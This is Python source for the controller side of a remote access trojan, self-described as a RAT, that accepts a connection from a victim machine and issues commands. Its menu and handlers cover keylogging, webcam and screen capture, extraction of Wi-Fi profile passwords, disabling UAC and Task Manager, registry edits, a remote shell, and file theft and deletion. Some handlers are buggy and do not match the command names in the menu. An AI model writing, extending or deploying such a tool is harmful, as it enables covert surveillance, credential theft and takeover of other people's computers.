import socket
import random
import os


def banner():
    print("======================================================")
    print("                       Commands                       ")
    print("======================================================")
    print("System: ")
    print("======================================================")
    print(f'''
    help                      all commands available
    writein <text>            write the text to current opened window
    browser                   enter query to browser
    turnoffmon                turn off the monitor
    turnonmon                 turn on the monitor
    reboot                    reboot the system
    drivers                   all drivers of PC
    kill                      kill the system task
    sendmessage               send messagebox with the text
    cpu_cores                 number of CPU cores
    systeminfo (extended)     all basic info about system (via cmd)
    tasklist                  all system tasks
    localtime                 current system time
    curpid                    PID of client's process
    sysinfo (shrunk)        basic info about system (Powers of Python)
    shutdown                  shutdown client's PC
    isuseradmin               check if user is admin
    extendrights              extend system rights
    disabletaskmgr            disable Task Manager
    enabletaskmgr             enable Task Manager
    disableUAC                disable UAC
    monitors                  get all used monitors
    geolocate                 get location of computer
    volume-up                  increase system volume to 100%
    volume-down                decrease system volume to 0%
    set-value                  set value in registry
    del-key                    delete key in registry
    create-key                 create key in registry
    setwallpaper              set wallpaper
    exit                      terminate the session of RAT`
    ''')
    print("======================================================")
    print("Shell: ")
    print("======================================================")
    print(f'''
    pwd                       get current working directory
    shell                     execute commands via cmd
    cd                        change directory
    [Driver]:                 change current driver
    cd ..                     change directory back
    dir                       get all files of current directory
    abspath                   get absolute path of files
    ''')
    print("======================================================")
    print("Network: ")
    print("======================================================")
    print(f'''
    ipconfig                  local ip
    portscan                  port scanner
    profiles                  network profiles
    profilepswd               password for profile
    ''')
    print("======================================================")
    print("Input devices: ")
    print("======================================================")
    print(f'''
    keyscan_start             start keylogger
    send_logs                 send captured keystrokes
    stop_keylogger            stop keylogger
    disable(--keyboard/--mouse/--all) 
    enable(--keyboard/--mouse/--all)
    ''')
    print("======================================================")
    print("Video: ")
    print("======================================================")
    print(f'''
    screenshare               overseeing remote PC
    webcam                    webcam video capture
    breakstream               break webcam/screenshare stream
    screenshot                capture screenshot
    webcam_snap               capture webcam photo
    ''')
    print("======================================================")
    print("Files:")
    print("======================================================")
    print(f'''
    delfile <file>            delete file
    editfile <file> <text>    edit file
    createfile <file>         create file
    download <file> <home dir> download file
    upload                    upload file
    cp <file1> <file2>        copy file
    mv <file> <path>          move file
    searchfile <file> <dir>   search for file in mentioned directory
    mkdir <dir-name>           make directory
    rmdir <dir-name>           remove directory
    startfile <file>          start file
    readfile <file>           read from file
            ''')
    print("======================================================")


def stop_server():
    serv.stop_server()


def result():
    client.send(command.encode())
    result_output = client.recv(1024).decode()
    print(result_output)


class DWARE_RAT:
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def build_connection(self):
        global client, address, serv
        serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        serv.bind((self.host, self.port))
        serv.listen(7)
        print("[+] Waiting for clients Connection...")
        client, address = serv.accept()
        print()
        ipcli = client.recv(1024).decode()
        print(f"[*] Connection is established successfully with {ipcli}")
        print()

    def server(self):
        try:
            from vidstream import StreamingServer
            serv = StreamingServer(self.host, 8080)
            serv.start_server()
        except:
            print("Module not Found in library bank")

    def execute_commands(self):
        banner()
        while True:
            global command
            command = input("Command >> ")

            if command == "shell":
                client.send(command.encode())
                while 1 == 1:
                    command = str(input("input -->> "))
                    client.send(command.encode())
                    if command.lower() == "exit":
                        break
                    response_output = client.recv(1024).decode()
                    print(response_output)
                client.close()
                serv.close()

            elif command == "set-value":
                client.send(command.encode())
                const = str(input("Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, "
                                  "HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG]: "))
                root = str(input("Enter path to save key [ex. SOFTWARE\\test]: "))
                key = str(input("Enter the key name: "))
                value = str(input("Enter the value of the key [None, 0, 1, 2, 3 etc...]: "))
                client.send(const.encode())
                client.send(root.encode())
                client.send(key.encode())
                client.send(value.encode())
                response_output = client.recv(1024).decode()
                print(response_output)

            elif command == "del-key":
                client.send(command.encode())
                const = str(input("Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, "
                                  "HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG]: "))
                root = str(input("Enter path to the key: "))
                client.send(const.encode())
                client.send(root.encode())
                response_output = client.recv(1024).decode()
                print(response_output)

            elif command == 'create-key':
                client.send(command.encode())
                const = str(input("Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, "
                                  "HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG]: "))
                root = str(input('Enter the path to key: '))
                client.send(const.encode())
                client.send(root.encode())
                response_output = client.recv(1024).decode()
                print(response_output)

            elif command == "disableUAC":
                result()

            elif command == "reboot":
                result()

            elif command == "usb-drivers":
                result()

            elif command == "volume-up":
                result()

            elif command == "volume-down":
                result()

            elif command == "monitors":
                result()

            elif command[:4] == "kill":
                if not command[5:]:
                    print("No process mentioned to terminate")
                else:
                    result()

            elif command == "extendrights":
                result()

            elif command == "geolocate":
                result()

            elif command == "turnonmon":
                result()

            elif command == "turnoffmon":
                result()

            elif command == "setupwallpaper":
                client.send(command.encode())
                text = str(input("Enter the filename: "))
                client.send(text.encode())
                response_output = client.recv(1024).decode()
                print(response_output)

            elif command == "keys_scan":
                client.send(command.encode())
                response_output = client.recv(1024).decode()
                print(response_output)

            elif command == "send_logs":
                client.send(command.encode())
                response_output = client.recv(1024).decode()
                print(response_output)

            elif command == "stop_logs":
                client.send(command.encode())
                response_output = client.recv(1024).decode()
                print(response_output)

            elif command[:7] == "delfile":
                if not command[8:]:
                    print("No file delete")
                else:
                    result()

            elif command[:10] == "createfile":
                if not command[11:]:
                    print("No file to create")
                else:
                    result()

            elif command == "ipconfig":
                result()

            elif command[:7] == "writein":
                if not command[8:]:
                    print("No text to output")
                else:
                    result()

            elif command == "sendmessage":
                client.send(command.encode())
                text = str(input("Enter the message: "))
                client.send(text.encode())
                title = str(input("Enter the title for the message: "))
                client.send(title.encode())
                response_output = client.recv(1024).decode()
                print(response_output)

            elif command == "profilepwd":
                client.send(command.encode())
                profiles = str(input("Enter the profile name: "))
                client.send(profiles.encode())
                response_output = client.recv(2147483647).decode()
                print(response_output)

            elif command == "profiles":
                result()

            elif command == "cpu_cores":
                result()

            elif command[:3] == "cd":
                if not command[4:]:
                    print("Can't locate directory")
                else:
                    result()

            elif command == "portscan":
                result()

            elif command == "cd..":
                result()

            elif command[1:2] == ":":
                result()

            elif command == "dir":
                result()

            elif command == "systeminfo":
                result()

            elif command[:7] == "abspath":
                if not command[8:]:
                    print("No File ")
                else:
                    result()

            elif command == "localtime":
                result()

            elif command[:8] == "readfile":
                if not command[9:]:
                    print("No file to read")
                else:
                    client.send(command.encode())
                    response_output = client.recv(2147483647).decode()
                    print("===================================================")
                    print(response_output)
                    print("===================================================")

            elif command.startswith("disable") and command.endswith("--keyboard"):
                result()

            elif command.startswith("disable") and command.endswith("--mouse"):
                result()

            elif command.startswith("disable") and command.endswith("--all"):
                result()

            elif command.startswith("enable") and command.endswith("--keyboard"):
                result()

            elif command.startswith("enable") and command.endswith("--mouse"):
                result()

            elif command.startswith("enable") and command.endswith("--all"):
                result()

            elif command[:7] == "browser":
                client.send(command.encode())
                query = str(input("Enter your query to search: "))
                client.send(query.encode())
                response_output = client.recv(1024).decode()
                print(response_output)

            elif command[:2] == "cp":
                result()

            elif command[:2] == "mv":
                result()

            elif command[:8] == "editfile":
                result()

            elif command[:5] == "mkdir":
                if not command[6:]:
                    print("No directory name")
                else:
                    result()

            elif command[:5] == "rmdir":
                if not command[6:]:
                    print("no directory name")
                else:
                    result()

            elif command[:10] == "searchfile":
                result()

            elif command == "curpid":
                result()

            elif command == "sysinfo":
                result()

            elif command == "breakstream":
                stop_server()

            elif command == "pwd":
                result()

            elif command == "screenshare":
                client.send(command.encode("utf-8"))
                self.server()

            elif command == "webcam":
                client.send(command.encode("utf-8"))
                self.server()

            elif command[:9] == "startfile":
                if not command[10:]:
                    print("No file to launch")
                else:
                    result()

            elif command[:8] == "download":
                try:
                    client.send(command.encode())
                    file = client.recv(2147483647)
                    with open(f"{command.split(' ')[2]}", 'wb') as f:
                        f.write(file.encode())
                        f.close()
                    print("File is downloaded")
                except:
                    print("Not enough arguments")

            elif command == "upload":
                client.send(command.encode())
                file = str(input("Enter the filepath to download the file: "))
                filename = str(input("Enter the filename with extension: "))
                data = open(file, 'rb')
                filedata = data.read(2147483647)
                client.send(filename.encode())
                print("File has been sent")
                client.send(filedata)

            elif command == "disabletaskmgr":
                result()

            elif command == "enabletaskmgr":
                result()

            elif command == "isuseradmin":
                result()

            elif command == "help":
                banner()

            elif command == "screenshot":
                client.send(command.encode())
                file = client.recv(2147483647).decode()
                path = f"{os.getcwd}\\{random.randint(11111,99999)}.png"
                with open(path, "wb") as f:
                    f.write(file.encode())
                    f.close()
                path1 = os.path.abspath(path)
                print(f"File is stored at {path1}")

            elif command == "webcam_snap":
                client.send(command.encode())
                file = client.recv(2147483647).decode()
                with open(f"{os.getcwd}\\{random.randint(11111,99999)}.png", "wb") as f:
                    f.write(file.encode())
                    f.close()
                print("File is downloaded")

            elif command == "exit":
                client.send(command.encode())
                output = client.recv(2147483647).decode()
                print(output)
                serv.close()
                client.close()


rat = DWARE_RAT("127.0.0.1", 8080)
if __name__ == "__main__":
    rat.build_connection()
    rat.execute_commands()

